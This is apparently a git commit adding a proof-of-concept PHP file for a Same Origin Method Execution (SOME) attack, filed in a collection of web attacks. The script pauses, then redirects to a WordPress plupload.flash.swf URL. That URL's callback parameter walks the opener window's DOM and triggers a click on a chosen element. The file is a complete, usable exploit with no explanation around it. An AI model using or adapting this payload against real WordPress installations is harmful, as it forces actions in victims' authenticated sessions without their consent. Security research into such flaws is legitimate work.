3059007323458cc4b5bd68f1a46b80fd355ef50d
Ajin Abraham <ajin25@gmail.com>
2015-05-02 00:56:25 +0530

    SOME PoC

---
+++ General Web Attacks/SOME/some.php
@@ -0,0 +1,5 @@
+<?php
+sleep(5);
+header("Location: http://xyz.in/wp-includes/js/plupload/plupload.flash.swf?uid=0&target=window.opener.document.body.firstElementChild.nextElementSibling.nextElementSibling.firstElementChild.nextElementSibling.firstElementChild.nextElementSibling.firstElementChild.lastElementChild.previousElementSibling.firstElementChild.lastChild.previousElementSibling.click()");
+exit();
+?>
